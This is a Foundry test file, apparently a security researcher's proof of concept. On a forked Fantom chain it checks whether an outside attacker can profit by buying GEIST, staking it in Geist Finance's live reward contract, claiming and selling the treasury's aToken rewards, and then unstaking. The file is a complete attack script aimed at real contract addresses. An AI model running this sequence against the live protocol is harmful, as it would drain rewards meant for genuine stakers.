// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/GeistInterfaces.sol";

/// @title Geist Finance — staking-reward farming PoC (external unprivileged attacker)
/// @notice The Geist staking contract (MultiFeeDistribution 0x49c93a95…) streams the treasury's
///         aTokens (aLINK, aCRV, aMIM, aDAI, aETH, aWFTM, …) to GEIST stakers. GEIST is freely
///         buyable on the live DEX for ~$0.000012. This test measures whether a fresh attacker can
///         buy GEIST, stake it, claim aToken rewards, redeem + sell them, unstake and sell the
///         GEIST back, and come out ahead (net of real DEX slippage).
contract GeistStakingFarmTest is Test {
    address constant POOL = 0x9FAD24f572045c7869117160A571B2e50b10d068;
    address constant SPOOKY_ROUTER = 0xF491e7B69E4244ad4002BC14e878a34207E38c29;
    address constant SPIRIT_ROUTER = 0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52;
    address constant WFTM = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
    address constant GEIST = 0xd8321AA83Fb0a4ECd6348D4577431310A6E0814d;
    address constant STAKING = 0x49c93a95dbcc9A6A4D8f77E59c038ce5020e82f8;

    address[9] ASSETS = [
        0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E,
        0x74b23882a30290451A17c44f4F05243b6b58C76d,
        0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83,
        0x321162Cd933E2Be498Cd2267a90534A804051b11,
        0x049d68029688eAbF473097a2fC38ef61633A3C7A,
        0x04068DA6C83AFCFA0e13ba15A6696662335D5B75,
        0x1E4F97b9f9F913c46F1632781732927B9019C68b,
        0x82f0B8B456c1A451378467398982d4834b6829c1,
        0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8
    ];
    string[9] SYMS = ["DAI", "ETH", "WFTM", "BTC", "fUSDT", "USDC", "CRV", "MIM", "LINK"];

    function _selectFork() internal returns (uint256) {
        string[6] memory urls = [
            vm.envOr("FANTOM_RPC_URL", string("")),
            "https://rpc2.fantom.network",
            "https://rpc3.fantom.network",
            "https://rpcapi.fantom.network",
            "https://fantom.drpc.org",
            "https://1rpc.io/ftm"
        ];
        for (uint256 i = 0; i < urls.length; i++) {
            if (bytes(urls[i]).length == 0) continue;
            try vm.createSelectFork(urls[i]) returns (uint256) {
                return block.number;
            } catch {}
        }
        revert("no working fantom fork rpc");
    }

    function setUp() public {
        _selectFork();
        emit log_named_uint("fork block", block.number);
    }

    function _sell(address token, uint256 amount, address router) internal returns (uint256 out) {
        if (amount == 0) return 0;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WFTM;
        uint256 sellable = amount;
        for (uint256 a = 0; a < 5 && sellable > 0; a++) {
            IERC20(token).approve(router, sellable);
            try IUniswapV2Router(router).swapExactTokensForTokens(sellable, 0, path, address(this), block.timestamp)
            returns (uint256[] memory got) {
                out += got[1];
                break;
            } catch {
                sellable = sellable * 3 / 4;
            }
        }
    }

    function test_staking_farm_roundtrip() public {
        uint256 wftmStart = 1_000_000e18;
        deal(WFTM, address(this), wftmStart);

        // 1) buy GEIST with WFTM (Spooky)
        address[] memory path = new address[](2);
        path[0] = WFTM;
        path[1] = GEIST;
        uint256 spend = 20_000e18;
        IERC20(WFTM).approve(SPOOKY_ROUTER, spend);
        uint256[] memory got = IUniswapV2Router(SPOOKY_ROUTER).swapExactTokensForTokens(
            spend, 0, path, address(this), block.timestamp);
        uint256 geistBought = got[1];
        emit log_named_uint("GEIST bought", geistBought);

        // 2) stake (unlocked, so it can be withdrawn any time)
        IERC20(GEIST).approve(STAKING, geistBought);
        IMultiFeeDistribution(STAKING).stake(geistBought, false);

        // 3) one week later: claim ALL rewards (deployed contract exposes getReward() with no args)
        vm.warp(block.timestamp + 7 days);
        (bool ok,) = STAKING.call(abi.encodeWithSignature("getReward()"));
        emit log_named_string("getReward() ok?", ok ? "YES" : "NO");

        // 4) redeem every aToken received for underlying and sell it
        uint256 totalOut;
        for (uint256 i = 0; i < ASSETS.length; i++) {
            address atok = ILendingPool(POOL).getReserveData(ASSETS[i]).aTokenAddress;
            uint256 bal = IERC20(atok).balanceOf(address(this));
            if (bal == 0) continue;
            emit log_named_uint(string.concat("aToken received ", SYMS[i]), bal);
            // redeem capped by the reserve's cash
            uint256 cash = IERC20(ASSETS[i]).balanceOf(atok);
            uint256 redeemAmt = bal < cash ? bal : cash;
            if (redeemAmt > 0) {
                try ILendingPool(POOL).withdraw(ASSETS[i], redeemAmt, address(this)) {} catch {}
            }
            uint256 underlying = IERC20(ASSETS[i]).balanceOf(address(this));
            if (underlying > 0) {
                uint256 o1 = _sell(ASSETS[i], underlying, SPOOKY_ROUTER);
                uint256 o2 = _sell(ASSETS[i], IERC20(ASSETS[i]).balanceOf(address(this)), SPIRIT_ROUTER);
                totalOut += o1 + o2;
                emit log_named_uint(string.concat("  sold ", SYMS[i]), o1 + o2);
            }
        }
        emit log_named_uint("WFTM from rewards", totalOut);

        // 5) unstake and sell the GEIST back
        IMultiFeeDistribution(STAKING).withdraw(geistBought);
        uint256 geistBack = IERC20(GEIST).balanceOf(address(this));
        uint256 backOut = _sell(GEIST, geistBack, SPOOKY_ROUTER);
        emit log_named_uint("WFTM back from GEIST sale", backOut);

        uint256 wftmEnd = IERC20(WFTM).balanceOf(address(this));
        emit log_named_int("NET P&L (WFTM)", int256(wftmEnd) - int256(wftmStart));
        emit log_named_int("  of which GEIST round-trip loss", int256(backOut) - int256(spend));
    }
}
